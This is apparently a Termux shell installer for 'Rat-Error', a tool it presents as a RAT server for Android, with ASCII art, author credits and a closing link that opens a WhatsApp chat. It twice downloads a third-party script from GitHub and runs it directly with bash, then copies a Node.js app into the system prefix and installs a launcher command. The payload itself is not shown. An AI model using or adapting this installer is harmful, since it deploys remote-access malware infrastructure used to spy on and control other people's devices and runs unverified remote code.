#!/data/data/com.termux/files/usr/bin/sh


apt update && apt upgrade -y
pkg install python-pip toilet -y
pip install lolcat -y
apt remove openjdk-17
pkg install proot wget && wget https://github.com/h4ck3r0/Java-termux/releases/download/javafix.sh/javafix.sh && bash javafix.sh

clear

echo '

 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⣋⣩⣭⣴⠶⠶⠶⠶⠶⠶⠶⠶⣶⣭⣍⣙⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⣩⣴⠾⠛⠯⡅⠠⠤⡀⢂⠐⠲⢺⠰⢢⠀⠇⠀⡨⠭⡛⠷⢦⣍⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣡⡶⠛⠉⠀⡀⠀⣅⡱⢰⡐⠉⠀⣈⢈⣈⢀⣈⣑⡂⠀⢅⡠⢁⢐⠄⡏⠛⢷⣌⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⢋⣴⠟⠉⠒⣲⢀⡮⠑⠀⠀⠀⠀⠀⠀⠸⠉⠈⢉⠈⠙⠩⠅⠀⠀⠐⠊⠁⢌⡠⢄⢀⠈⠻⣦⡙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢏⣴⠟⠁⡐⢆⡑⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⠖⠰⠞⠰⠞⠶⠀⠀⠀⠀⠀⠀⠀⠀⠂⢥⠊⠆⠈⠻⣦⡹⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢡⡾⠋⠀⢐⣎⢊⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⡶⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⣀⣤⡀⢀⠤⡃⡜⢷⡌⢿⣿⣿⣿
⣿⣿⡿⣰⡟⠁⠉⠑⠄⣵⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣟⡇⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣦⠀⠒⠢⠈⢻⣆⢻⣿⣿
⣿⡿⣰⡟⠀⢓⠠⢄⡈⠻⣿⣿⣿⣿⢿⣿⣶⣀⠀⠀⠀⢀⣿⡿⣾⣯⡿⣿⡄⠀⠀⠀⣀⣶⣿⣟⣿⣿⣿⣿⡟⢁⡹⠕⡣⠀⢻⣆⢿⣿
⣿⢁⣿⠀⠌⣐⠔⣾⣿⣆⠘⢿⣽⣿⣿⣿⣿⣟⡷⣦⣀⣾⣿⣿⣷⣿⣿⣿⣷⣀⣤⢾⣻⣿⣿⣿⣿⣯⡟⠋⣠⣿⣷⠰⣉⠅⠀⢿⡌⣿
⡇⣼⠃⠐⠪⠔⣸⣿⣿⣿⣷⣀⠙⢿⣿⣻⣿⣾⣿⢿⣯⣟⣯⢿⡽⣯⠿⣽⣻⣿⣽⣿⣿⣿⣟⣿⡿⠋⢀⣾⣿⣿⣿⣇⠇⠣⠀⠘⣧⢸
⠁⣿⠀⠀⠀⢀⣿⣿⣿⡿⢋⣵⣦⡀⠑⢟⣿⣻⣿⣿⣿⡾⣿⣿⡽⣿⣻⣿⣷⣿⣾⣿⣟⣿⣽⠊⢀⣴⣮⡙⢿⣿⣿⣿⡄⠀⠀⠀⣿⡈
⢸⡏⠀⠀⠀⢸⣿⡿⣋⣴⣿⣟⣿⣿⣆⠈⠻⣟⣯⣿⣿⣿⣿⣳⢟⣳⣟⣿⣾⣿⢿⣯⢿⠏⠁⣠⣿⣿⣿⢿⣦⣙⢿⣿⡇⠀⠀⠀⢸⡇
⢸⡇⠀⠀⠀⠸⣫⣾⣿⢿⣾⣽⣿⣯⠏⣵⣄⠈⠻⣽⣿⣳⢯⡽⢯⡷⣞⣳⣟⣿⡿⠟⠁⣠⣮⡹⢟⣷⣿⣫⣿⢿⣷⣝⠃⠀⠀⠀⢸⡇
⠸⣧⠀⠀⠀⢸⣿⣿⡽⣿⣾⣟⠟⣥⣾⣿⣿⢦⡀⠙⢮⡽⢯⡽⣯⠷⣯⢷⣞⡳⠉⢀⣴⣿⣿⡷⣮⠻⣿⡿⣿⢯⣿⣿⡇⠀⠀⠀⣸⡇
⡆⣿⠀⠀⠀⠈⣿⣿⣿⣯⠗⣡⣾⣿⣾⣿⣯⢿⠋⠀⠀⡙⢯⡽⣞⣟⣧⡟⢊⠀⠀⠙⢷⣻⣿⣿⣽⣷⣌⠻⣽⣿⣿⣿⠁⠀⠀⠀⣿⢠
⣇⢸⣇⠀⠀⠀⠸⣿⡿⣫⣾⣿⣿⣷⡿⣿⠏⠁⠀⢀⣴⣿⣆⠻⣝⣾⠚⣡⣿⣧⡀⠀⠈⠻⣿⢿⣾⣿⣿⣵⣜⢿⣿⡇⠀⠀⠀⢰⡏⣸
⣿⡄⣿⡀⠀⠀⠀⢋⣼⣿⣿⣻⣽⣿⡽⠃⠀⠀⢠⣾⣿⣻⣿⢷⡌⣠⣾⣿⣟⣿⣷⡄⠀⠀⠈⢟⡿⣯⣿⣿⣿⣷⡝⠀⠀⠀⢀⣿⢡⣿
⣿⣿⡈⣷⡀⠀⠀⠀⠻⣿⡿⣿⣿⠏⠀⠀⠀⣰⣿⣟⣯⣷⣯⣿⣽⣷⣯⢾⣷⣻⣽⣿⣦⠀⠀⠀⠹⣿⣷⣿⣿⠟⠀⠀⠀⢀⣾⢃⣾⣿
⣿⣿⣷⡘⢷⡄⠀⠀⠀⠙⢿⡟⠁⠀⠀⢀⣼⣿⣻⣞⣿⣯⢿⡿⣿⣻⣿⡿⣿⣿⣛⡾⣽⣧⡀⠀⠀⠈⢻⡷⠋⠀⠀⠀⢀⣾⢃⣾⣿⣿
⣿⣿⣿⣿⣌⢻⣆⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣷⣿⣿⡿⣿⣿⣽⣷⣿⣿⢿⣿⣿⣻⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⣠⡟⣡⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣧⡙⢷⣄⠀⠀⢀⠄⠐⠻⢿⡿⣿⣽⣷⣿⣟⣯⢿⣻⣾⡿⣽⣻⢿⣾⣿⣯⣿⡿⠗⢃⣐⢄⠀⠀⣠⡾⢋⣴⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣦⡙⢷⣤⡑⠀⡋⡡⡠⢌⠙⠻⠿⢿⣿⣿⣿⡽⣟⣿⣿⣿⡿⠿⠟⢋⡁⡄⡎⣱⠑⢀⣠⡾⢋⣴⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣌⠻⢶⣤⣀⠣⠃⢃⢯⠐⡖⢠⡠⠍⡩⠉⠉⠤⡀⡔⢄⡈⡌⠴⠚⢀⣠⡶⠟⣩⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣬⣙⠳⢶⣤⣤⣈⡁⠂⠓⠀⠊⠁⠀⠒⠃⢃⣈⣤⣤⡶⠞⢛⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⣍⣙⣛⣛⣛⣛⣛⣛⣛⣛⣋⣩⣭⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

                Developed By SAMIDU
                           
' | lolcat                           
 echo -e "\e[1;31m [\e[32m√\e[31m] \e[1;91m by \e[1;36m Samidu Jayasundara \e[93m/ \e[100;92m Dark-Error/c/SAMIDU\e[0m"
 echo -e "\e[34m[\e[92m✓\e[34m]\033[92m INSTALLING REQUIREED PACKAGES"
 sleep 6.0
 apt install nodejs nano yarn -y
 clear
                 
                  toilet -F border -f mono12  "Apktool"  | lolcat
                  printf ""
                  printf "\e[1;34m[*] \e[1;96mcreated by \e[1;33m SAMIDU ( Dark Error )\e[0m"
              
                  
cd /data/data/com.termux/files/usr/share/
mkdir Rat-Error 
cd $HOME/Rat-Error/.files
pkg install wget && wget https://github.com/h4ck3r0/Java-termux/releases/download/javafix.sh/javafix.sh && bash javafix.sh
cp -r app assets clientData includes index.js package-lock.json package.json /data/data/com.termux/files/usr/share/Rat-Error/
sed -i 'ccd $PREFIX/share/Rat-Error/ && node index.js' $HOME/Rat-Error/Rat-Error
cp -r $HOME/Rat-Error/Rat-Error /data/data/com.termux/files/usr/bin/
chmod +x /data/data/com.termux/files/usr/bin/Rat-Error

cd /data/data/com.termux/files/usr/share/Rat-Error/
yarn add expressjs
clear
echo -e "\e[34mINSTALLED SUCCESSFULLY....[\e[92m✓\e[34m]\e[92m"
echo -e "\e[34mTHANKS TO Samidu[\e[92m✓\e[34m]\e[92m"
sleep 5.0
clear
echo -e "\e[1;34m[√] \e[96mType Rat-Error To Start Server\e[0m"


termux-open-url https://wa.me/+94761652230

